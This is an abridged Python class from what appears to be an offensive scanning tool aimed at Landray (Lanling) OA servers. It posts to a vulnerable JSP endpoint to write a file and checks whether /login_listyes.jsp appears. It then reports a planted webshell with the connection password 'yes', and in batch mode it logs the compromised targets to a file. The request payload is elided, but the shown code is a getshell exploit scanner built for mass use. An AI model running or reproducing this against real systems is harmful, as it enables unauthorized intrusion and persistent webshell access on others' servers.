...
class LanlingSsrfGetshellScan:
    ...
    def run(self,url):
        res_url = url + '/sys/ui/extend/varkind/custom.jsp'
        res2_url = url + '/login_listyes.jsp'
        ...
        try:
            response = requests.post(res_url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            if response.status_code == 200:
                response2 = requests.get(url, headers=header, timeout=5, verify=self.ssl, proxies=self.proxy)
                if response2.status_code == 200 and response2.url == res2_url:
                    OutPrintInfoSuc("LanLing",f"蓝凌Lanling-文件写入成功:{res2_url}")
                    if not self.batch:
                        OutPrintInfo("LanLing","连接密码为[b red]yes[/b red] ")
                    else:
                        OutPutFile("lanling_file_write.txt",f"蓝凌Lanling-文件写入成功:{res2_url} | 密码:yes")
    ...
    def main(self,target):
        ...
        if not self.batch:
            OutPrintInfo("LanLing",'开始进行蓝凌-GetShell')
        self.run(url)
        if not self.batch:
            OutPrintInfo("LanLing",'蓝凌-GetShell结束')
